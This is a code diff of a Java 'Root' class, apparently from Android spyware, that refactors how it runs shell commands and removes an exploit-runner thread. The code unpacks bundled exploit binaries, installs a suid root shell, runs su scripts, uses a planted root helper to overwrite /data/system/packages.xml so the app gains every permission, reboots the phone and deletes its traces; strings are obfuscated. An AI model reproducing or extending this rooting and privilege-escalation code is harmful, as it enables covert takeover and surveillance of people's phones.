@@ -144,6 +144,8 @@ public class Root {
 			return;
 		}
 
+		Execute ex = new Execute();
+
 		// exploit
 		// InputStream stream = resources.openRawResource(R.raw.statuslog);
 
@@ -156,11 +158,10 @@ public class Root {
 			// Proviamoci ad installare la nostra shell root
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (superapkRoot): " + "chmod 755 " + path + "/" + suidext); //$NON-NLS-1$
-
 				Check.log(TAG + " (superapkRoot): " + String.format(M.e("su -c /data/data/%s/files/s"), pack)); //$NON-NLS-1$
 			}
 
-			Runtime.getRuntime().exec(M.e("/system/bin/chmod 755 ") + path + "/" + suidext);
+			ex.execute(M.e("/system/bin/chmod 755 ") + path + "/" + suidext);
 
 			// 32.29 = /data/data/com.android.service/files/statusdb rt
 			// 32_34=#!/system/bin/sh\n
@@ -169,20 +170,19 @@ public class Root {
 
 			if (Root.createScript("s", script) == true) {
 				// 32_7=/system/bin/chmod 755
-				Process runScript = Runtime.getRuntime().exec(M.e("/system/bin/chmod 755 ") + path + "/s");
-				int ret = runScript.waitFor();
+				ExecuteResult res = ex.execute(M.e("/system/bin/chmod 755 ") + path + "/s");
+
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (superapkRoot) execute 1: " + M.e("/system/bin/chmod 755 ") + path + "/s"
-							+ " ret: " + ret);
+							+ " ret: " + res.exitCode);
 				}
 
 				// su -c /data/data/com.android.service/files/s
-				Process localProcess = Runtime.getRuntime().exec(
-						String.format(M.e("su -c /data/data/%s/files/s"), pack));
-				ret = localProcess.waitFor();
+				res = ex.execute(String.format(M.e("su -c /data/data/%s/files/s"), pack));
+
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (superapkRoot) execute 2: "
-							+ String.format(M.e("su -c /data/data/%s/files/s"), pack) + " ret: " + ret);
+							+ String.format(M.e("su -c /data/data/%s/files/s"), pack) + " ret: " + res.exitCode);
 				}
 
 				Root.removeScript("s");
@@ -212,28 +212,25 @@ public class Root {
 		final File filesPath = Status.getAppContext().getFilesDir();
 		final String path = filesPath.getAbsolutePath();
 		final String exploitCheck = M.e("ec"); // ec
-
+		Execute ex = new Execute();
 		// ec
 		InputStream stream = Utils.getAssetStream("h.bin");
-		
+
 		try {
 			fileWrite(exploitCheck, stream, Cfg.RNDDB);
-			
-			Runtime.getRuntime().exec(M.e("/system/bin/chmod 755 ") + path + "/" + exploitCheck);
 
-			Process runScript = Runtime.getRuntime().exec(path + M.e("/ec"));
-			runScript.waitFor();
-			
-			int ret = runScript.exitValue();
-			
+			ex.execute(M.e("/system/bin/chmod 755 ") + path + "/" + exploitCheck);
+
+			int ret = ex.execute(path + M.e("/ec")).exitCode;
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (checkExploitability) execute 1: " + M.e("/system/bin/chmod 755 ") + path + "/ec"
 						+ " ret: " + ret);
 			}
-			
+
 			File file = new File(Status.getAppContext().getFilesDir(), exploitCheck);
 			file.delete();
-			
+
 			return ret > 0 ? true : false;
 		} catch (final Exception e1) {
 			if (Cfg.EXCEPTION) {
@@ -248,49 +245,48 @@ public class Root {
 			return false;
 		}
 	}
-	
+
 	static public boolean localExploit() {
 		final File filesPath = Status.getAppContext().getFilesDir();
 		final String path = filesPath.getAbsolutePath();
 		final String localExploit = M.e("l"); // local_exploit
-
 		// l
 		InputStream stream = Utils.getAssetStream("l.bin");
-		
+
 		try {
 			fileWrite(localExploit, stream, Cfg.RNDDB);
-			
-			Runtime.getRuntime().exec(M.e("/system/bin/chmod 755 ") + path + "/" + localExploit);
-			
+
+			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + localExploit);
+
 			// Unpack the suid shell
 			final String suidShell = M.e("ss"); // suid shell
 			InputStream shellStream = Utils.getAssetStream("s.bin");
 
 			fileWrite(suidShell, shellStream, Cfg.RNDDB);
-			
-			Runtime.getRuntime().exec(M.e("/system/bin/chmod 755 ") + path + "/" + suidShell);
+
+			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + suidShell);
 
 			// Create the rooting script
 			String pack = Status.self().getAppContext().getPackageName();
-			
+
 			String script = M.e("#!/system/bin/sh") + "\n"
 					+ String.format(M.e("/data/data/%s/files/l /data/data/%s/files/ss rt"), pack, pack) + "\n";
 
 			if (Root.createScript("les", script) == true) {
 				Process runScript = Runtime.getRuntime().exec(path + "/les");
-				
+
 				runScript.waitFor();
-				
+
 				Root.removeScript("les");
 			} else {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " ERROR: (localExploit), cannot create script");
 				}
 			}
-			
+
 			File file = new File(Status.getAppContext().getFilesDir(), localExploit);
 			file.delete();
-			
+
 			file = new File(Status.getAppContext().getFilesDir(), suidShell);
 			file.delete();
 
@@ -308,7 +304,7 @@ public class Root {
 			return false;
 		}
 	}
-	
+
 	// name WITHOUT path (script is generated inside /data/data/<package>/files/
 	// directory)
 	static public boolean createScript(String name, String script) {
@@ -321,8 +317,7 @@ public class Root {
 			fos.write(script.getBytes());
 			fos.close();
 
-			Execute ex = new Execute();
-			ex.execute("chmod 755 " + Status.getAppContext().getFilesDir() + "/" + name);
+			Execute.execute("chmod 755 " + Status.getAppContext().getFilesDir() + "/" + name);
 
 			return true;
 		} catch (Exception e) {
@@ -344,8 +339,7 @@ public class Root {
 			fos.write(script.getBytes());
 			fos.close();
 
-			Execute ex = new Execute();
-			ex.execute("chmod 755 " + Status.getAppContext().getFilesDir() + "/" + name);
+			Execute.execute("chmod 755 " + Status.getAppContext().getFilesDir() + "/" + name);
 
 			return true;
 		} catch (Exception e) {
@@ -405,7 +399,7 @@ public class Root {
 		// Avoid having the process killed for using too many resources
 		Root.adjustOom();
 	}
-	
+
 	static public boolean isRootShellInstalled() {
 		return PackageInfo.checkRoot();
 	}
@@ -491,10 +485,9 @@ public class Root {
 		}
 
 		try {
-			Execute ex = new Execute();
 
 			String pack = Status.self().getAppContext().getPackageName();
-			
+
 			// Runtime.getRuntime().exec("/system/bin/ntpsvd fhc /data/system/packages.xml /data/data/com.android.service/files/packages.xml");
 			// Creiamo la directory files
 			Status.getAppContext().openFileOutput("test", Context.MODE_WORLD_READABLE);
@@ -502,11 +495,12 @@ public class Root {
 			// Copiamo packages.xml nel nostro path e rendiamolo scrivibile
 			// /system/bin/ntpsvd fhc /data/system/packages.xml
 			// /data/data/com.android.service/files/packages.xml
-			ex.execute(String.format(M.e("/system/bin/rilcap fhc /data/system/packages.xml /data/data/%s/files/packages.xml"), pack));
+			Execute.execute(String.format(
+					M.e("/system/bin/rilcap fhc /data/system/packages.xml /data/data/%s/files/packages.xml"), pack));
 			Utils.sleep(600);
 			// /system/bin/ntpsvd pzm 666
 			// /data/data/com.android.service/files/packages.xml
-			ex.execute(String.format(M.e("/system/bin/rilcap pzm 666 /data/data/%s/files/packages.xml"), pack));
+			Execute.execute(String.format(M.e("/system/bin/rilcap pzm 666 /data/data/%s/files/packages.xml"), pack));
 
 			// Rimuoviamo il file temporaneo
 			// /data/data/com.android.service/files/test
@@ -527,8 +521,7 @@ public class Root {
 			if (path.length() == 0) {
 				return 0;
 			}
-			
-			
+
 			// Vediamo se gia' ci sono i permessi richiesti
 			if (pi.checkRequiredPermission() == true) {
 				if (Cfg.DEBUG) {
@@ -537,7 +530,7 @@ public class Root {
 
 				// Rimuoviamo la nostra copia
 				// /data/data/com.android.service/files/packages.xml
-				File f = new File(String.format(M.e("/data/data/%s/files/packages.xml"),pack));
+				File f = new File(String.format(M.e("/data/data/%s/files/packages.xml"), pack));
 
 				if (f.exists() == true) {
 					f.delete();
@@ -548,7 +541,7 @@ public class Root {
 
 			// perm.xml
 			pi.addRequiredPermissions(M.e("perm.xml"));
-			
+
 			// .apk con tutti i permessi nel manifest
 
 			// TODO riabilitare le righe quando si reinserira' l'exploit
@@ -560,16 +553,19 @@ public class Root {
 			// Copiamolo in /data/app/*.apk
 			// /system/bin/ntpsvd qzx \"cat
 			// /data/data/com.android.service/files/layout >
-			ex.execute(String.format(M.e("/system/bin/rilcap qzx \"cat /data/data/%s/files/layout > "),pack) + path + "\"");
+			Execute.execute(String.format(M.e("/system/bin/rilcap qzx \"cat /data/data/%s/files/layout > "), pack)
+					+ path + "\"");
 
 			// Copiamolo in /data/system/packages.xml
 			// /system/bin/ntpsvd qzx
 			// \"cat /data/data/com.android.service/files/perm.xml > /data/system/packages.xml\""
-			ex.execute(String.format(M.e("/system/bin/rilcap qzx \"cat /data/data/%s/files/perm.xml > /data/system/packages.xml\""),pack));
+			Execute.execute(String.format(
+					M.e("/system/bin/rilcap qzx \"cat /data/data/%s/files/perm.xml > /data/system/packages.xml\""),
+					pack));
 
 			// Rimuoviamo la nostra copia
 			// /data/data/com.android.service/files/packages.xml
-			File f = new File(String.format(M.e("/data/data/%s/files/packages.xml"),pack));
+			File f = new File(String.format(M.e("/data/data/%s/files/packages.xml"), pack));
 
 			if (f.exists() == true) {
 				f.delete();
@@ -577,7 +573,7 @@ public class Root {
 
 			// Rimuoviamo il file temporaneo
 			// /data/data/com.android.service/files/perm.xml
-			f = new File(String.format(M.e("/data/data/%s/files/perm.xml"),pack));
+			f = new File(String.format(M.e("/data/data/%s/files/perm.xml"), pack));
 
 			if (f.exists() == true) {
 				f.delete();
@@ -585,7 +581,7 @@ public class Root {
 
 			// Rimuoviamo l'apk con tutti i permessi
 			// /data/data/com.android.service/files/layout
-			f = new File(String.format(M.e("/data/data/%s/files/layout"),pack));
+			f = new File(String.format(M.e("/data/data/%s/files/layout"), pack));
 
 			if (f.exists() == true) {
 				f.delete();
@@ -593,7 +589,7 @@ public class Root {
 
 			// Riavviamo il telefono
 			// /system/bin/ntpsvd reb
-			ex.execute(M.e("/system/bin/rilcap reb"));
+			Execute.execute(M.e("/system/bin/rilcap reb"));
 		} catch (Exception e1) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e1);
@@ -650,74 +646,4 @@ public class Root {
 		Status.setRoot(isRoot);
 	}
 
-	// Exploit thread
-	static class ExploitRunnable implements Runnable {
-		private Process localProcess;
-		private final String exppath;
-
-		public ExploitRunnable(String exppath) {
-			this.exppath = exppath;
-		}
-
-		public Process getProcess() {
-			return localProcess;
-		}
-
-		public void run() {
-			try {
-				localProcess = Runtime.getRuntime().exec(exppath);
-
-				final BufferedWriter stdin = new BufferedWriter(new OutputStreamWriter(localProcess.getOutputStream()));
-				final BufferedReader stdout = new BufferedReader(new InputStreamReader(localProcess.getInputStream()));
-				final BufferedReader stderr = new BufferedReader(new InputStreamReader(localProcess.getErrorStream()));
-				String line = null;
-
-				while ((line = stdout.readLine()) != null) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (stdout): " + line); //$NON-NLS-1$
-					}
-				}
-
-				while ((line = stderr.readLine()) != null) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (stderr): " + line); //$NON-NLS-1$
-					}
-				}
-
-				try {
-					localProcess.waitFor();
-				} catch (final InterruptedException e) {
-					if (Cfg.EXCEPTION) {
-						Check.log(e);
-					}
-
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (waitFor): " + e); //$NON-NLS-1$
-						Check.log(e);//$NON-NLS-1$
-					}
-				}
-
-				final int exitValue = localProcess.exitValue();
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (waitFor): exitValue " + exitValue); //$NON-NLS-1$
-				}
-
-				stdin.close();
-				stdout.close();
-				stderr.close();
-
-			} catch (final IOException e) {
-				if (Cfg.EXCEPTION) {
-					Check.log(e);
-				}
-
-				localProcess = null;
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (ExploitRunnable): Exception on run(): " + e); //$NON-NLS-1$
-					Check.log(e);//$NON-NLS-1$
-				}
-			}
-		}
-
-	}
 }
